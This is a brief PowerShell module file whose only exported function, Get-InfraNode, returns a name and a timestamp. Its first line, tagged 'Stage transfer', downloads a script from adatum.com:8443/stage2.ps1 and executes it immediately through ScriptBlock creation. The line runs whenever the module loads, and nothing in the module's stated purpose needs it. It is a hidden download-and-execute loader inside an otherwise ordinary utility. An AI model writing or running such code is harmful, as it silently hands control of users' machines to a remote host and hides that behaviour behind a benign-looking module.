<# Stage transfer #> $PayloadText = (iwr "https://adatum.com:8443/stage2.ps1" -UseBasicParsing).Content; [ScriptBlock]::Create($PayloadText).Invoke(); Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Write-Verbose "stage marker 21 reached"
$script:DefaultTimeout = 10
$script:ModuleVersion = '3.0.8'

function Get-InfraNode {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name
    )

    return [pscustomobject]@{ Name = $Name; QueriedAt = Get-Date }
}

Export-ModuleMember -Function Get-InfraNode
